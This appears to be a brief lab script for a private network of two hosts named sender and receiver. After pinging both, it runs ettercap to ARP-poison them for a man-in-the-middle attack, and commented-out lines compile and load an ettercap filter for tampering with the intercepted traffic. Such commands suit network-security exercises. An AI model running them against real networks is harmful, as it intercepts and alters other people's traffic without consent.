ping -c 1 sender
ping -c 1 receiver

#etterfilter -d test.filter -o filter.ef
#sudo ettercap -Tq -F /home/ws/filter.ef -i eth0 -M arp /172.18.0.4// /172.18.0.5//
#tcpdump -vv
sudo ettercap -T -i eth0 -M arp /172.18.0.4// /172.18.0.5//
